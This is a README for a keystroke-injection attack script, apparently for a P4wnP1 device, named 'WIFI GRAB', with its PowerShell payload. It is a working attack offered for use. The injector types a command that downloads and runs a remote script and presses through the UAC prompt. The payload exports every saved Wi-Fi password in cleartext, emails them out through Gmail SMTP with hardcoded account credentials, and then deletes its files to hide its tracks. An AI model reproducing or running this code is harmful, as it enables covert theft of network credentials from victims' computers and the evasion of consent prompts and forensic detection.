# WIFI GRAB
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Script
```js
layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// the powershell script and this payload can be found at
// https://github.com/axel05869/Wifi-Grab
// --------GUIDE---------
// download the powershell script.
// edit and add the required data.
// copy and paste all the text to notepad and save as anyname.txt.
// upload the text to: https://cutt.ly/WjnNPa4
// copy the direct download link.
delay(500)
// Opens the Windows Run prompt.
press("GUI r")
// Delays 0.2 seconds to give the Run prompt time to open.
delay(200)
// this command will download the text and save as d.ps1 then run
// if the script failed to run change the ExecPolicy to Bypass
type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1")
// Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
// Delay 0.5 seconds to give the UAC prompt time to open.
delay(500)
// Presses Alt + Y to bypass UAC.
press("ALT y")
```

The payload used for this script:
```
<#
This script has been developed by Ernest & Isaac
#>


# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p


# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}


# --------Email the output file---------
# Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
# The following lines define the variables to run the script in order to send the wifi credentials to your account.
$FROM = "eur1p3des@protonmail.com"
$PASS = "Eur1p3des21"
$TO = "eur1p3des@tuta.io"

$PC_NAME = "$env:computername"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "wifipass.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))


# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass


# remove payload
rm d.ps1
```
